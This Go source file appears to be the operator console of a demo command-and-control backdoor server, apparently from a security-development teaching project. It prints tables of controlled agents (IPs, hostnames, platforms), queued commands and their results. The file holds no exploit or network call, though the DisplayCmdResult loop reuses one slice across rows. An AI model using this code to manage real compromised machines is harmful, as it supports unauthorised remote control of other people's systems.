/*

Copyright (c) 2018 sec.lu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THEq
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

package cli

import (
	"fmt"
	"os"

	"github.com/olekukonko/tablewriter"

	"sec-dev-in-action-src/backdoor/command-control/command-control-demo/server/models"
)

func DisplayAgent(agents []models.Agent) {
	data := make([][]string, 0)
	for _, agent := range agents {
		agentInfo := make([]string, 0)
		agentInfo = append(agentInfo,
			fmt.Sprintf("%v", agent.AgentId),
			fmt.Sprintf("%v", agent.Ips),
			fmt.Sprintf("%v", agent.HostName),
			fmt.Sprintf("%v", agent.Platform),
		)
		data = append(data, agentInfo)
	}

	if len(data) > 0 {
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"agent_id", "ips", "hostname", "platform"})
		table.SetAlignment(tablewriter.ALIGN_CENTER)
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoMergeCells(true)
		table.AppendBulk(data)
		table.SetCaption(true, "Agent List")
		table.Render()
	}
}

func DisplayCommand(commands []models.Command) {
	data := make([][]string, 0)
	for _, cmd := range commands {
		cmdList := make([]string, 0)
		cmdList = append(cmdList,
			fmt.Sprintf("%v", cmd.AgentId),
			fmt.Sprintf("%v", cmd.Content),
			fmt.Sprintf("%v", cmd.CreateTime),
			fmt.Sprintf("%v", cmd.Status),
		)
		data = append(data, cmdList)
	}

	if len(data) > 0 {
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"agent_id", "command", "crete_time", "status"})
		table.SetAlignment(tablewriter.ALIGN_CENTER)
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoMergeCells(true)
		table.AppendBulk(data)
		table.SetCaption(true, "Command List")
		table.Render()
	}

}

func DisplayCmdResult() {
	data := make([][]string, 0)
	cmds, err := models.ListFinishCommand()
	if err == nil && len(cmds) > 0 {
		result := make([]string, 0)
		for _, cmd := range cmds {
			// 修改任务状态为已经展示
			cmdId := cmd.Id
			err := models.SetCmdStatusToEnd(cmdId)
			_ = err

			result = append(result,
				fmt.Sprintf("%v", cmd.AgentId),
				fmt.Sprintf("%v", cmd.Content),
				fmt.Sprintf("%v", cmd.UpdateTime),
				fmt.Sprintf("%v", cmd.Result),
			)
			data = append(data, result)
		}

		message("note", "command execute result")
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"agent_id", "command", "run_time", "result"})
		table.SetAlignment(tablewriter.ALIGN_CENTER)
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoMergeCells(true)
		table.AppendBulk(data)
		table.SetCaption(true, "Command Result")
		table.Render()
	}
}
